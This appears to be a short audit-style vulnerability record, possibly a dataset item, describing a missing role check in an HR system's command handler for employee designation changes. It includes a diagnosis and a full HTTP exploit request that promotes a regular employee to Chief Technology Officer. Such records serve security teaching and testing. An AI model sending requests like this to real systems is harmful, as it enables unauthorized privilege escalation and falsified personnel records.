diagnosis: The command handler appends an EmployeeDesignationChanged event to an employee's EventStoreDB stream without asserting that req.user has an HR_MANAGER role or administrative rights over the target employee's department. Any authenticated employee can elevate their job title or reassign peers.
exploit_request:
POST /api/commands/employees/designation HTTP/1.1
Host: hr-cqrs.enterprise.com
Authorization: Bearer <regular_employee_jwt>
Content-Type: application/json

{"employeeId": "emp_self_8820", "newTitle": "Chief Technology Officer", "department": "Executive"}
